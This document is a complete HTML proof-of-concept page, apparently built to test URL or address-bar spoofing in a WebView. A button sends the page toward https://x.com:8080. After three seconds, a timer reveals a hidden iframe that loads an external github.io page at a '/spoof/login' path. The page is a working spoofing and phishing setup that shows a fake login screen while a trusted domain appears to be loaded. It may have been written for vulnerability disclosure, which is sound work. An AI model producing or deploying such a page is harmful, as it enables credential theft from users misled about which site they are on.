<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>WebView Navigation Test PoC</title>

<style>
body {
  font-family: Arial, sans-serif;
  text-align: center;
  margin-top: 80px;
  background: #f5f5f5;
}

button {
  padding: 12px 20px;
  font-size: 16px;
  cursor: pointer;
}

#iframeContainer {
  margin-top: 20px;
}

#iframeContainer iframe {
  width: 550px;
  height: 400px;
  border: 1px solid #ccc;
  border-radius: 8px;
}
</style>

</head>

<body>

<h2>WebView Navigation Test PoC</h2>
<p>Test window.location behavior</p>

<button onclick="test()">Start Test</button>

<div id="iframeContainer" style="display:none;">
  <iframe 
    src="https://cnfdnfial-ops.github.io/spoof/login"
    title="Test iframe">
  </iframe>
</div>

<script>

function test() {
  window.location.href = "https://x.com:8080";
}

setTimeout(function() {
  document.getElementById("iframeContainer").style.display = "block";
}, 3000);

</script>

</body>
</html>
